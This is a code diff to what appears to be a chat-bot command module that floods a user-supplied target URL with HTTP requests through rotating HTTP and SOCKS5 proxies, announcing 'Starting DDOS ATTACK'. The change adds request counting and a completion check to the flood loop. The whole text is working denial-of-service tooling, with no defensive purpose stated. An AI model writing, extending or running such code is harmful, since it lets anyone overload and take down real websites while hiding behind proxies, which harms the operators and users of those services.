@@ -91,7 +91,7 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = (url, agent, headers, continueAttack) => {
+const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
     if (!continueAttack) return;
 
     const headersForRequest = {
@@ -108,10 +108,14 @@ const performAttack = (url, agent, headers, continueAttack) => {
 
     axios.get(url, {
         httpAgent: agent,
-        headers: headers || headersForRequest,
+        headers: headersForRequest,
         timeout: 0
     })
-    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack), 0))
+    .then(() => {
+        requestsSent++;
+        checkCompletion(requestsSent);
+        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    })
     .catch((err) => {
         if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503)."));
@@ -122,7 +126,9 @@ const performAttack = (url, agent, headers, continueAttack) => {
         } else {
             console.log(rainbow("Request failed with no response or unknown error."));
         }
-        setTimeout(() => performAttack(url, agent, headers, continueAttack), 0);
+        requestsSent++;
+        checkCompletion(requestsSent);
+        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     });
 };
 
@@ -139,12 +145,20 @@ module.exports["run"] = async ({ args, chat, font }) => {
     }
 
     let continueAttack = true;
+    let requestsSent = 0;
+
     await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
     const attackTimeout = setTimeout(() => {
         continueAttack = false;
-        chat.reply(font.thin("Max flood requests reached. Attack stopped."));
     }, (maxRequests / requestsPerSecond) * 1000);
+
+    const checkCompletion = (sentRequests) => {
+        if (sentRequests >= maxRequests) {
+            chat.reply(font.thin("DDOS ATTACK finished."));
+            continueAttack = false;
+        }
+    };
 
     for (let i = 0; i < numThreads; i++) {
         if (!continueAttack) break;
@@ -155,6 +169,6 @@ module.exports["run"] = async ({ args, chat, font }) => {
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
         const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
-        performAttack(targetUrl, agent, null, continueAttack);
+        performAttack(targetUrl, agent, continueAttack, requestsSent, checkCompletion);
     }
 };
